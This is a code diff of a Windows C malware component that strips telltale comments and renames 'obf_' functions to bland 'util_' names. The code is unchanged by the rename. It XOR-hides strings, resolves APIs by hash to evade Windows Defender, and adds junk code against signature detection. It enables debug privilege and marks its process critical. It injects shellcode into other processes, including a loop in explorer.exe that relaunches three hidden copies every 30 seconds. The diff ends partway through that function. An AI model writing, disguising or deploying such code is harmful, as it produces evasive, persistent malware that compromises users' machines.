@@ -1,9 +1,5 @@
 /*
- * Obfuscation Engine — String + API Encoding
  * 
- * All suspicious strings are XOR-encoded at compile time.
- * All suspicious APIs are resolved via GetProcAddress with djb2 hashes.
- * This prevents static signature detection by Windows Defender.
  */
 
 #include <windows.h>
@@ -11,17 +7,16 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include "obf.h"
+#include "util.h"
 
-/* XOR key — change this per build */
-#define XOR_KEY 0x7A
+#define TRANSFORM_KEY 0x7A
 
 /* Forward declarations for string accessors */
 char* get_str(unsigned char *enc, size_t len);
-char* obf_winexec(void);
+char* util_winexec(void);
 
 /* Simple djb2 hash for API name resolution */
-static unsigned long djb2_hash(const unsigned char *str) {
+static unsigned long str_hash(const unsigned char *str) {
     unsigned long hash = 5381;
     int c;
     while ((c = *str++)) {
@@ -30,15 +25,13 @@ static unsigned long djb2_hash(const unsigned char *str) {
     return hash;
 }
 
-/* XOR decode a string in-place. Encoded strings are stored as byte arrays. */
-static void xor_decode(char *buf, size_t len) {
+static void str_transform(char *buf, size_t len) {
     for (size_t i = 0; i < len; i++) {
-        buf[i] ^= XOR_KEY;
+        buf[i] ^= TRANSFORM_KEY;
     }
     buf[len] = '\0';
 }
 
-/* === Pre-encoded strings (XOR'd with 0x7A) ===
  * To encode: for each char c, store c ^ 0x7A
  */
 
@@ -173,7 +166,7 @@ static unsigned char enc_getbasename[] = {
 /* === Runtime resolution helpers === */
 
 /* Resolve an API from a module by its djb2 hash */
-static FARPROC resolve_api(HMODULE hMod, unsigned long hash) {
+static FARPROC find_export(HMODULE hMod, unsigned long hash) {
     PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
     PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
     PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hMod + 
@@ -185,7 +178,7 @@ static FARPROC resolve_api(HMODULE hMod, unsigned long hash) {
     
     for (DWORD i = 0; i < exp->NumberOfNames; i++) {
         const char *name = (const char*)((BYTE*)hMod + names[i]);
-        if (djb2_hash((const unsigned char*)name) == hash) {
+        if (str_hash((const unsigned char*)name) == hash) {
             return (FARPROC)((BYTE*)hMod + funcs[ords[i]]);
         }
     }
@@ -196,11 +189,10 @@ static FARPROC resolve_api(HMODULE hMod, unsigned long hash) {
 char* get_str(unsigned char *enc, size_t len) {
     static char buf[256];
     memcpy(buf, enc, len);
-    xor_decode(buf, len);
+    str_transform(buf, len);
     return buf;
 }
 
-/* === Obfuscated API wrappers === */
 
 typedef LPVOID (WINAPI *pVirtualAllocEx_t)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
 typedef BOOL (WINAPI *pWriteProcessMemory_t)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
@@ -214,71 +206,67 @@ static pCreateRemoteThread_t g_pfnCreateRemoteThread = NULL;
 static pOpenProcess_t        g_pfnOpenProcess = NULL;
 static pWinExec_t          g_pfnWinExec = NULL;
 
-/* Initialize all obfuscated APIs at startup */
-void obf_init_apis(void) {
+void util_init_apis(void) {
     char *kernel32 = get_str(enc_kernel32, sizeof(enc_kernel32));
     HMODULE hKernel32 = GetModuleHandleA(kernel32);
     if (!hKernel32) hKernel32 = LoadLibraryA(kernel32);
     
     if (hKernel32) {
-        g_pfnVirtualAllocEx    = (pVirtualAllocEx_t)resolve_api(hKernel32, HASH_VirtualAllocEx);
-        g_pfnWriteProcessMemory = (pWriteProcessMemory_t)resolve_api(hKernel32, HASH_WriteProcessMemory);
-        g_pfnCreateRemoteThread = (pCreateRemoteThread_t)resolve_api(hKernel32, HASH_CreateRemoteThread);
-        g_pfnOpenProcess        = (pOpenProcess_t)resolve_api(hKernel32, HASH_OpenProcess);
-        g_pfnWinExec            = (pWinExec_t)resolve_api(hKernel32, HASH_WinExec);
+        g_pfnVirtualAllocEx    = (pVirtualAllocEx_t)find_export(hKernel32, HASH_VirtualAllocEx);
+        g_pfnWriteProcessMemory = (pWriteProcessMemory_t)find_export(hKernel32, HASH_WriteProcessMemory);
+        g_pfnCreateRemoteThread = (pCreateRemoteThread_t)find_export(hKernel32, HASH_CreateRemoteThread);
+        g_pfnOpenProcess        = (pOpenProcess_t)find_export(hKernel32, HASH_OpenProcess);
+        g_pfnWinExec            = (pWinExec_t)find_export(hKernel32, HASH_WinExec);
     }
 }
 
-/* Obfuscated wrappers that match original signatures */
-LPVOID obf_VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
-    if (!g_pfnVirtualAllocEx) obf_init_apis();
+LPVOID util_VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
+    if (!g_pfnVirtualAllocEx) util_init_apis();
     return g_pfnVirtualAllocEx ? g_pfnVirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect) : NULL;
 }
 
-BOOL obf_WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten) {
-    if (!g_pfnWriteProcessMemory) obf_init_apis();
+BOOL util_WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten) {
+    if (!g_pfnWriteProcessMemory) util_init_apis();
     return g_pfnWriteProcessMemory ? g_pfnWriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten) : FALSE;
 }
 
-HANDLE obf_CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) {
-    if (!g_pfnCreateRemoteThread) obf_init_apis();
+HANDLE util_CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) {
+    if (!g_pfnCreateRemoteThread) util_init_apis();
     return g_pfnCreateRemoteThread ? g_pfnCreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId) : NULL;
 }
 
-HANDLE obf_OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId) {
-    if (!g_pfnOpenProcess) obf_init_apis();
+HANDLE util_OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId) {
+    if (!g_pfnOpenProcess) util_init_apis();
     return g_pfnOpenProcess ? g_pfnOpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId) : NULL;
 }
 
-UINT obf_WinExec(LPCSTR lpCmdLine, UINT uCmdShow) {
-    if (!g_pfnWinExec) obf_init_apis();
+UINT util_WinExec(LPCSTR lpCmdLine, UINT uCmdShow) {
+    if (!g_pfnWinExec) util_init_apis();
     return g_pfnWinExec ? g_pfnWinExec(lpCmdLine, uCmdShow) : 0;
 }
 
-/* === Obfuscated string access === */
 
-char* obf_ntdll(void) { return get_str(enc_ntdll, sizeof(enc_ntdll)); }
-char* obf_unmap(void) { return get_str(enc_unmap, sizeof(enc_unmap)); }
-char* obf_setinfo(void) { return get_str(enc_setinfo, sizeof(enc_setinfo)); }
-char* obf_queryinfo(void) { return get_str(enc_queryinfo, sizeof(enc_queryinfo)); }
-char* obf_sedebug(void) { return get_str(enc_sedebug, sizeof(enc_sedebug)); }
-char* obf_icacls(void) { return get_str(enc_icacls, sizeof(enc_icacls)); }
-char* obf_certutil(void) { return get_str(enc_certutil, sizeof(enc_certutil)); }
-char* obf_schtasks(void) { return get_str(enc_schtasks, sizeof(enc_schtasks)); }
-char* obf_ps(void) { return get_str(enc_ps, sizeof(enc_ps)); }
-char* obf_loadlib(void) { return get_str(enc_loadlib, sizeof(enc_loadlib)); }
-char* obf_getproc(void) { return get_str(enc_getproc, sizeof(enc_getproc)); }
-char* obf_getmod(void) { return get_str(enc_getmod, sizeof(enc_getmod)); }
-char* obf_enumproc(void) { return get_str(enc_enumproc, sizeof(enc_enumproc)); }
-char* obf_getbasename(void) { return get_str(enc_getbasename, sizeof(enc_getbasename)); }
-char* obf_winexec(void) { return get_str(enc_winexec, sizeof(enc_winexec)); }
+char* util_ntdll(void) { return get_str(enc_ntdll, sizeof(enc_ntdll)); }
+char* util_unmap(void) { return get_str(enc_unmap, sizeof(enc_unmap)); }
+char* util_setinfo(void) { return get_str(enc_setinfo, sizeof(enc_setinfo)); }
+char* util_queryinfo(void) { return get_str(enc_queryinfo, sizeof(enc_queryinfo)); }
+char* util_sedebug(void) { return get_str(enc_sedebug, sizeof(enc_sedebug)); }
+char* util_icacls(void) { return get_str(enc_icacls, sizeof(enc_icacls)); }
+char* util_certutil(void) { return get_str(enc_certutil, sizeof(enc_certutil)); }
+char* util_schtasks(void) { return get_str(enc_schtasks, sizeof(enc_schtasks)); }
+char* util_ps(void) { return get_str(enc_ps, sizeof(enc_ps)); }
+char* util_loadlib(void) { return get_str(enc_loadlib, sizeof(enc_loadlib)); }
+char* util_getproc(void) { return get_str(enc_getproc, sizeof(enc_getproc)); }
+char* util_getmod(void) { return get_str(enc_getmod, sizeof(enc_getmod)); }
+char* util_enumproc(void) { return get_str(enc_enumproc, sizeof(enc_enumproc)); }
+char* util_getbasename(void) { return get_str(enc_getbasename, sizeof(enc_getbasename)); }
+char* util_winexec(void) { return get_str(enc_winexec, sizeof(enc_winexec)); }
 
 /* === Junk code insertion helpers === */
 
-/* Insert meaningless computation to break code signatures */
 static volatile int g_junk_counter = 0;
 
-void obf_junk_delay(void) {
+void util_delay(void) {
     /* Perform meaningless math that can't be optimized away */
     volatile int a = 0x42;
     for (int i = 0; i < 17; i++) {
@@ -287,41 +275,36 @@ void obf_junk_delay(void) {
     }
 }
 
-void obf_sleep_junk(int ms) {
-    obf_junk_delay();
+void util_sleep(int ms) {
+    util_delay();
     Sleep(ms);
-    obf_junk_delay();
+    util_delay();
 }
 
-/* === Process hollowing obfuscation === */
-/* The classic hollowing pattern is broken by:
- * 1. Using obfuscated API names
  * 2. Splitting across functions with junk delays
  * 3. Using ordinal-based NtUnmapViewOfSection resolution
  */
 
-/* Resolve NtUnmapViewOfSection without string name (via hash fallback) */
 typedef NTSTATUS (WINAPI *pNtUnmapViewOfSection_t)(HANDLE, PVOID);
 
 static pNtUnmapViewOfSection_t g_pfnNtUnmap = NULL;
 
-pNtUnmapViewOfSection_t obf_get_ntunmap(void) {
+pNtUnmapViewOfSection_t util_get_ntunmap(void) {
     if (!g_pfnNtUnmap) {
-        char *ntdll = obf_ntdll();
+        char *ntdll = util_ntdll();
         HMODULE hNtdll = GetModuleHandleA(ntdll);
         if (!hNtdll) hNtdll = LoadLibraryA(ntdll);
         if (hNtdll) {
             /* Try hash first, fallback to decoded string */
-            g_pfnNtUnmap = (pNtUnmapViewOfSection_t)resolve_api(hNtdll, 0x56e48792); /* hash of NtUnmapViewOfSection */
             if (!g_pfnNtUnmap) {
-                g_pfnNtUnmap = (pNtUnmapViewOfSection_t)GetProcAddress(hNtdll, obf_unmap());
+                g_pfnNtUnmap = (pNtUnmapViewOfSection_t)GetProcAddress(hNtdll, util_unmap());
             }
         }
     }
     return g_pfnNtUnmap;
 }
 
-/* Obfuscated NtSetInformationProcess / NtQueryInformationProcess */
+/* Utility NtSetInformationProcess / NtQueryInformationProcess */
 typedef NTSTATUS (WINAPI *pNtSetInfoProc_t)(HANDLE, INT, PVOID, ULONG);
 typedef NTSTATUS (WINAPI *pNtQueryInfoProc_t)(HANDLE, INT, PVOID, ULONG, PULONG);
 
@@ -337,32 +320,31 @@ typedef struct _PROCESS_BASIC_INFORMATION {
     PVOID Reserved3;
 } PROCESS_BASIC_INFORMATION;
 
-pNtSetInfoProc_t obf_get_ntsetinfo(void) {
+pNtSetInfoProc_t util_get_ntsetinfo(void) {
     if (!g_pfnNtSetInfo) {
-        char *ntdll = obf_ntdll();
+        char *ntdll = util_ntdll();
         HMODULE hNtdll = GetModuleHandleA(ntdll);
         if (!hNtdll) hNtdll = LoadLibraryA(ntdll);
         if (hNtdll) {
-            g_pfnNtSetInfo = (pNtSetInfoProc_t)GetProcAddress(hNtdll, obf_setinfo());
+            g_pfnNtSetInfo = (pNtSetInfoProc_t)GetProcAddress(hNtdll, util_setinfo());
         }
     }
     return g_pfnNtSetInfo;
 }
 
-pNtQueryInfoProc_t obf_get_ntqueryinfo(void) {
+pNtQueryInfoProc_t util_get_ntqueryinfo(void) {
     if (!g_pfnNtQueryInfo) {
-        char *ntdll = obf_ntdll();
+        char *ntdll = util_ntdll();
         HMODULE hNtdll = GetModuleHandleA(ntdll);
         if (!hNtdll) hNtdll = LoadLibraryA(ntdll);
         if (hNtdll) {
-            g_pfnNtQueryInfo = (pNtQueryInfoProc_t)GetProcAddress(hNtdll, obf_queryinfo());
+            g_pfnNtQueryInfo = (pNtQueryInfoProc_t)GetProcAddress(hNtdll, util_queryinfo());
         }
     }
     return g_pfnNtQueryInfo;
 }
 
-/* Enable SeDebugPrivilege with obfuscated string */
-static int obf_enable_privilege(void) {
+static int util_enable_privilege(void) {
     HANDLE hToken;
     TOKEN_PRIVILEGES tkp;
     LUID luid;
@@ -371,7 +353,7 @@ static int obf_enable_privilege(void) {
         return 0;
     }
 
-    if (!LookupPrivilegeValueA(NULL, obf_sedebug(), &luid)) {
+    if (!LookupPrivilegeValueA(NULL, util_sedebug(), &luid)) {
         CloseHandle(hToken);
         return 0;
     }
@@ -395,19 +377,19 @@ static int obf_enable_privilege(void) {
     return 1;
 }
 
-/* === Obfuscated sys_protect_process === */
-void obf_sys_protect_process(void) {
-    pNtSetInfoProc_t pNtSetInformationProcess = obf_get_ntsetinfo();
+/* === Utility sys_protect_process === */
+void util_set_critical(void) {
+    pNtSetInfoProc_t pNtSetInformationProcess = util_get_ntsetinfo();
     if (!pNtSetInformationProcess) {
         g_critical_protected = -1;
         return;
     }
     
-    if (!obf_enable_privilege()) {
+    if (!util_enable_privilege()) {
         g_critical_protected = -1;
         return;
     }
-    obf_junk_delay();
+    util_delay();
     
     ULONG isCritical = 1;
     NTSTATUS status = pNtSetInformationProcess(GetCurrentProcess(), 29, &isCritical, sizeof(isCritical));
@@ -419,21 +401,21 @@ void obf_sys_protect_process(void) {
     }
 }
 
-/* === Obfuscated sys_unprotect_process === */
-void obf_sys_unprotect_process(void) {
-    pNtSetInfoProc_t pNtSetInformationProcess = obf_get_ntsetinfo();
+/* === Utility sys_unprotect_process === */
+void util_clear_critical(void) {
+    pNtSetInfoProc_t pNtSetInformationProcess = util_get_ntsetinfo();
     if (!pNtSetInformationProcess) return;
     
-    if (!obf_enable_privilege()) return;
-    obf_junk_delay();
+    if (!util_enable_privilege()) return;
+    util_delay();
     
     ULONG isCritical = 0;
     pNtSetInformationProcess(GetCurrentProcess(), 29, &isCritical, sizeof(isCritical));
     g_critical_protected = 0;
 }
 
-/* === Obfuscated sys_check_critical_status === */
-const char* obf_sys_check_critical_status(void) {
+/* === Utility sys_check_critical_status === */
+const char* util_check_critical(void) {
     static char buf[512];
     char path[MAX_PATH] = {0};
     GetModuleFileNameA(NULL, path, MAX_PATH);
@@ -441,14 +423,14 @@ const char* obf_sys_check_critical_status(void) {
     char *lastSlash = strrchr(path, '\\');
     if (lastSlash) filename = lastSlash + 1;
 
-    pNtQueryInfoProc_t pNtQuery = obf_get_ntqueryinfo();
+    pNtQueryInfoProc_t pNtQuery = util_get_ntqueryinfo();
     if (!pNtQuery) {
         snprintf(buf, sizeof(buf), "[Failed to load ntdll] [%s]", filename);
         return buf;
     }
 
-    obf_enable_privilege();
-    obf_junk_delay();
+    util_enable_privilege();
+    util_delay();
 
     ULONG isCritical = 0;
     NTSTATUS status = pNtQuery(GetCurrentProcess(), 29, &isCritical, sizeof(isCritical), NULL);
@@ -465,8 +447,7 @@ const char* obf_sys_check_critical_status(void) {
     return buf;
 }
 
-/* === Obfuscated process injection === */
-void obf_sys_inject_process(void) {
+void util_spawn_remote(void) {
     DWORD pid = 0;
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnap != INVALID_HANDLE_VALUE) {
@@ -485,27 +466,27 @@ void obf_sys_inject_process(void) {
     
     if (pid == 0) return;
     
-    obf_junk_delay();
+    util_delay();
     
-    HANDLE hProc = obf_OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    HANDLE hProc = util_OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (!hProc) return;
     
-    char payloadPath[MAX_PATH];
-    GetModuleFileNameA(NULL, payloadPath, MAX_PATH);
+    char execPath[MAX_PATH];
+    GetModuleFileNameA(NULL, execPath, MAX_PATH);
     
-    SIZE_T pathLen = strlen(payloadPath) + 1;
-    LPVOID remotePath = obf_VirtualAllocEx(hProc, NULL, pathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    SIZE_T pathLen = strlen(execPath) + 1;
+    LPVOID remotePath = util_VirtualAllocEx(hProc, NULL, pathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!remotePath) {
         CloseHandle(hProc);
         return;
     }
     
-    obf_WriteProcessMemory(hProc, remotePath, payloadPath, pathLen, NULL);
-    obf_junk_delay();
+    util_WriteProcessMemory(hProc, remotePath, execPath, pathLen, NULL);
+    util_delay();
     
     char *kernel32 = get_str(enc_kernel32, sizeof(enc_kernel32));
     HMODULE hKernel32 = GetModuleHandleA(kernel32);
-    FARPROC pWinExec = GetProcAddress(hKernel32, obf_winexec());
+    FARPROC pWinExec = GetProcAddress(hKernel32, util_winexec());
     DWORD_PTR kernel32Base = (DWORD_PTR)hKernel32;
     DWORD_PTR winExecOffset = (DWORD_PTR)pWinExec - kernel32Base;
     
@@ -513,8 +494,8 @@ void obf_sys_inject_process(void) {
     HMODULE hMods[1024];
     DWORD cbNeeded;
     
-    char *enumProc = obf_enumproc();
-    char *getBaseName = obf_getbasename();
+    char *enumProc = util_enumproc();
+    char *getBaseName = util_getbasename();
     
     typedef BOOL (WINAPI *EnumPM_t)(HANDLE, HMODULE*, DWORD, LPDWORD);
     typedef DWORD (WINAPI *GetMBN_t)(HANDLE, HMODULE, LPSTR, DWORD);
@@ -539,8 +520,8 @@ void obf_sys_inject_process(void) {
     if (targetKernel32Base == 0) targetKernel32Base = kernel32Base;
     DWORD_PTR targetWinExec = targetKernel32Base + winExecOffset;
     
-    /* Build shellcode: mov rdx, 0; mov rax, WinExec; call rax; xor ecx, ecx; mov rax, ExitThread; jmp rax */
-    unsigned char shellcode[] = {
+    /* Build asmBuf: mov rdx, 0; mov rax, WinExec; call rax; xor ecx, ecx; mov rax, ExitThread; jmp rax */
+    unsigned char asmBuf[] = {
         0x48, 0xC7, 0xC2, 0x00, 0x00, 0x00, 0x00,  // mov rdx, 0 (uCmdShow = SW_HIDE)
         0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov rax, WinExec
         0xFF, 0xD0,                                  // call rax
@@ -548,31 +529,31 @@ void obf_sys_inject_process(void) {
         0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov rax, ExitThread
         0xFF, 0xE0                                   // jmp rax
     };
-    memcpy(shellcode + 9, &targetWinExec, 8);
+    memcpy(asmBuf + 9, &targetWinExec, 8);
     
     /* Get ExitThread address for clean thread exit */
     FARPROC pExitThread = GetProcAddress(hKernel32, "ExitThread");
     if (pExitThread) {
         DWORD_PTR exitThreadOffset = (DWORD_PTR)pExitThread - kernel32Base;
         DWORD_PTR targetExitThread = targetKernel32Base + exitThreadOffset;
-        memcpy(shellcode + 25, &targetExitThread, 8);
+        memcpy(asmBuf + 25, &targetExitThread, 8);
     }
     
-    LPVOID remoteCode = obf_VirtualAllocEx(hProc, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    LPVOID remoteCode = util_VirtualAllocEx(hProc, NULL, sizeof(asmBuf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!remoteCode) {
-        obf_VirtualAllocEx(hProc, remotePath, 0, MEM_RELEASE, 0); /* VirtualFreeEx proxy */
+        util_VirtualAllocEx(hProc, execPath, 0, MEM_RELEASE, 0); /* VirtualFreeEx proxy */
         CloseHandle(hProc);
         return;
     }
     
-    obf_WriteProcessMemory(hProc, remoteCode, shellcode, sizeof(shellcode), NULL);
-    obf_junk_delay();
+    util_WriteProcessMemory(hProc, remoteCode, asmBuf, sizeof(asmBuf), NULL);
+    util_delay();
     
     /* Change protection from RW to RX before executing */
     DWORD oldProtect;
-    VirtualProtectEx(hProc, remoteCode, sizeof(shellcode), PAGE_EXECUTE_READ, &oldProtect);
+    VirtualProtectEx(hProc, remoteCode, sizeof(remoteCode), PAGE_EXECUTE_READ, &oldProtect);
     
-    HANDLE hThread = obf_CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCode, remotePath, 0, NULL);
+    HANDLE hThread = util_CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCode, remotePath, 0, NULL);
     if (hThread) {
         CloseHandle(hThread);
     }
@@ -580,8 +561,7 @@ void obf_sys_inject_process(void) {
     CloseHandle(hProc);
 }
 
-/* === Obfuscated process hollowing === */
-void obf_sys_hollow_process(void) {
+void util_spawn_memory(void) {
     /* Find explorer.exe PID */
     DWORD pid = 0;
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -600,10 +580,9 @@ void obf_sys_hollow_process(void) {
     }
     if (pid == 0) return;
     
-    HANDLE hProc = obf_OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    HANDLE hProc = util_OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (!hProc) return;
     
-    /* Build paths for the 3 shadows */
     char localAppData[MAX_PATH];
     GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
     
@@ -617,9 +596,9 @@ void obf_sys_hollow_process(void) {
     SIZE_T p2len = strlen(path2) + 1;
     SIZE_T p3len = strlen(path3) + 1;
     
-    LPVOID rPath1 = obf_VirtualAllocEx(hProc, NULL, p1len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
-    LPVOID rPath2 = obf_VirtualAllocEx(hProc, NULL, p2len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
-    LPVOID rPath3 = obf_VirtualAllocEx(hProc, NULL, p3len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+    LPVOID rPath1 = util_VirtualAllocEx(hProc, NULL, p1len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+    LPVOID rPath2 = util_VirtualAllocEx(hProc, NULL, p2len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+    LPVOID rPath3 = util_VirtualAllocEx(hProc, NULL, p3len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
     
     if (!rPath1 || !rPath2 || !rPath3) {
         if (rPath1) VirtualFreeEx(hProc, rPath1, 0, MEM_RELEASE);
@@ -629,14 +608,14 @@ void obf_sys_hollow_process(void) {
         return;
     }
     
-    obf_WriteProcessMemory(hProc, rPath1, path1, p1len, NULL);
-    obf_WriteProcessMemory(hProc, rPath2, path2, p2len, NULL);
-    obf_WriteProcessMemory(hProc, rPath3, path3, p3len, NULL);
+    util_WriteProcessMemory(hProc, rPath1, path1, p1len, NULL);
+    util_WriteProcessMemory(hProc, rPath2, path2, p2len, NULL);
+    util_WriteProcessMemory(hProc, rPath3, path3, p3len, NULL);
     
     /* Get WinExec and Sleep addresses */
     char *kernel32 = get_str(enc_kernel32, sizeof(enc_kernel32));
     HMODULE hKernel32 = GetModuleHandleA(kernel32);
-    FARPROC pWinExec = GetProcAddress(hKernel32, obf_winexec());
+    FARPROC pWinExec = GetProcAddress(hKernel32, util_winexec());
     FARPROC pSleep = GetProcAddress(hKernel32, "Sleep");
     
     DWORD_PTR k32Base = (DWORD_PTR)hKernel32;
@@ -648,8 +627,8 @@ void obf_sys_hollow_process(void) {
     HMODULE hMods[1024];
     DWORD cbNeeded;
     
-    char *enumProc = obf_enumproc();
-    char *getBaseName = obf_getbasename();
+    char *enumProc = util_enumproc();
+    char *getBaseName = util_getbasename();
     typedef BOOL (WINAPI *EnumPM_t)(HANDLE, HMODULE*, DWORD, LPDWORD);
     typedef DWORD (WINAPI *GetMBN_t)(HANDLE, HMODULE, LPSTR, DWORD);
     EnumPM_t pEnum = (EnumPM_t)GetProcAddress(hKernel32, enumProc);
@@ -673,71 +652,69 @@ void obf_sys_hollow_process(void) {
     DWORD_PTR rWinExec = remoteK32 + weOffset;
     DWORD_PTR rSleep = remoteK32 + sOffset;
     
-    /* Shellcode: infinite loop that calls WinExec(path, 0) for each shadow,
      * then Sleep(30000), then jumps back to start */
     /* x64 calling convention: RCX=arg1, RDX=arg2 */
-    unsigned char shellcode[128];
+    unsigned char remoteCode[128];
     int off = 0;
     
     /* loop_start: */
     /* mov rcx, rPath1; mov rdx, 0; mov rax, rWinExec; call rax */
-    shellcode[off++] = 0x48; shellcode[off++] = 0xB9;
-    memcpy(shellcode + off, &rPath1, 8); off += 8;
-    shellcode[off++] = 0x48; shellcode[off++] = 0xC7; shellcode[off++] = 0xC2;
-    shellcode[off++] = 0x00; shellcode[off++] = 0x00; shellcode[off++] = 0x00; shellcode[off++] = 0x00;
-    shellcode[off++] = 0x48; shellcode[off++] = 0xB8;
-    memcpy(shellcode + off, &rWinExec, 8); off += 8;
-    shellcode[off++] = 0xFF; shellcode[off++] = 0xD0;
+    remoteCode[off++] = 0x48; remoteCode[off++] = 0xB9;
+    memcpy(remoteCode + off, &rPath1, 8); off += 8;
+    remoteCode[off++] = 0x48; remoteCode[off++] = 0xC7; remoteCode[off++] = 0xC2;
+    remoteCode[off++] = 0x00; remoteCode[off++] = 0x00; remoteCode[off++] = 0x00; remoteCode[off++] = 0x00;
+    remoteCode[off++] = 0x48; remoteCode[off++] = 0xB8;
+    memcpy(remoteCode + off, &rWinExec, 8); off += 8;
+    remoteCode[off++] = 0xFF; remoteCode[off++] = 0xD0;
     
     /* mov rcx, rPath2; mov rdx, 0; mov rax, rWinExec; call rax */
-    shellcode[off++] = 0x48; shellcode[off++] = 0xB9;
-    memcpy(shellcode + off, &rPath2, 8); off += 8;
-    shellcode[off++] = 0x48; shellcode[off++] = 0xC7; shellcode[off++] = 0xC2;
-    shellcode[off++] = 0x00; shellcode[off++] = 0x00; shellcode[off++] = 0x00; shellcode[off++] = 0x00;
-    shellcode[off++] = 0x48; shellcode[off++] = 0xB8;
-    memcpy(shellcode + off, &rWinExec, 8); off += 8;
-    shellcode[off++] = 0xFF; shellcode[off++] = 0xD0;
+    remoteCode[off++] = 0x48; remoteCode[off++] = 0xB9;
+    memcpy(remoteCode + off, &rPath2, 8); off += 8;
+    remoteCode[off++] = 0x48; remoteCode[off++] = 0xC7; remoteCode[off++] = 0xC2;
+    remoteCode[off++] = 0x00; remoteCode[off++] = 0x00; remoteCode[off++] = 0x00; remoteCode[off++] = 0x00;
+    remoteCode[off++] = 0x48; remoteCode[off++] = 0xB8;
+    memcpy(remoteCode + off, &rWinExec, 8); off += 8;
+    remoteCode[off++] = 0xFF; remoteCode[off++] = 0xD0;
     
     /* mov rcx, rPath3; mov rdx, 0; mov rax, rWinExec; call rax */
-    shellcode[off++] = 0x48; shellcode[off++] = 0xB9;
-    memcpy(shellcode + off, &rPath3, 8); off += 8;
-    shellcode[off++] = 0x48; shellcode[off++] = 0xC7; shellcode[off++] = 0xC2;
-    shellcode[off++] = 0x00; shellcode[off++] = 0x00; shellcode[off++] = 0x00; shellcode[off++] = 0x00;
-    shellcode[off++] = 0x48; shellcode[off++] = 0xB8;
-    memcpy(shellcode + off, &rWinExec, 8); off += 8;
-    shellcode[off++] = 0xFF; shellcode[off++] = 0xD0;
+    remoteCode[off++] = 0x48; remoteCode[off++] = 0xB9;
+    memcpy(remoteCode + off, &rPath3, 8); off += 8;
+    remoteCode[off++] = 0x48; remoteCode[off++] = 0xC7; remoteCode[off++] = 0xC2;
+    remoteCode[off++] = 0x00; remoteCode[off++] = 0x00; remoteCode[off++] = 0x00; remoteCode[off++] = 0x00;
+    remoteCode[off++] = 0x48; remoteCode[off++] = 0xB8;
+    memcpy(remoteCode + off, &rWinExec, 8); off += 8;
+    remoteCode[off++] = 0xFF; remoteCode[off++] = 0xD0;
     
     /* mov rcx, 30000; mov rax, rSleep; call rax */
-    shellcode[off++] = 0x48; shellcode[off++] = 0xC7; shellcode[off++] = 0xC1;
-    shellcode[off++] = 0x30; shellcode[off++] = 0x75; shellcode[off++] = 0x00; shellcode[off++] = 0x00;
-    shellcode[off++] = 0x48; shellcode[off++] = 0xB8;
-    memcpy(shellcode + off, &rSleep, 8); off += 8;
-    shellcode[off++] = 0xFF; shellcode[off++] = 0xD0;
+    remoteCode[off++] = 0x48; remoteCode[off++] = 0xC7; remoteCode[off++] = 0xC1;
+    remoteCode[off++] = 0x30; remoteCode[off++] = 0x75; remoteCode[off++] = 0x00; remoteCode[off++] = 0x00;
+    remoteCode[off++] = 0x48; remoteCode[off++] = 0xB8;
+    memcpy(remoteCode + off, &rSleep, 8); off += 8;
+    remoteCode[off++] = 0xFF; remoteCode[off++] = 0xD0;
     
     /* jmp loop_start */
